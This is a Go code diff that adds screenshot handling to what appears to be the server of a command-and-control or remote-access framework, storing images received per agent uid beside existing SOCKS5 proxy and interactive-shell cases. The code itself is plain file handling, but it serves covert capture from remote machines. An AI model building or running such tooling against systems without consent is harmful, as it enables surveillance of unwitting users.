@@ -769,6 +769,30 @@ WHERE uid = ? AND file_path = ?;
 				md5sign := data[:16]
 				rawData := data[16:]
 				command.VarSocks5Queue.Add(uid, fmt.Sprintf("%x", md5sign), string(rawData))
+			case command.SCREENSHOT:
+				if len(data) == 0 {
+					logger.Error("Empty screenshot data")
+					break
+				}
+				screenshotDir := filepath.Join("Screenshots", uid)
+				if err := os.MkdirAll(screenshotDir, 0755); err != nil {
+					logger.Error("Failed to create screenshot directory:", err)
+					break
+				}
+				fileName := fmt.Sprintf("%d_screenshot.png", time.Now().UnixNano())
+				fullPath := filepath.Join(screenshotDir, fileName)
+				if err := os.WriteFile(fullPath, data, 0644); err != nil {
+					logger.Error("Failed to write screenshot:", err)
+					break
+				}
+				database.Engine.Insert(&database.Screenshots{
+					Uid:       uid,
+					FileName:  fileName,
+					FilePath:  fullPath,
+					CreatedAt: time.Now().Unix(),
+				})
+				logger.Info("Screenshot saved:", fullPath)
+
 			case command.WriteInteractieShell:
 				sessionIDLen := int(binary.BigEndian.Uint32(data[:4]))
 
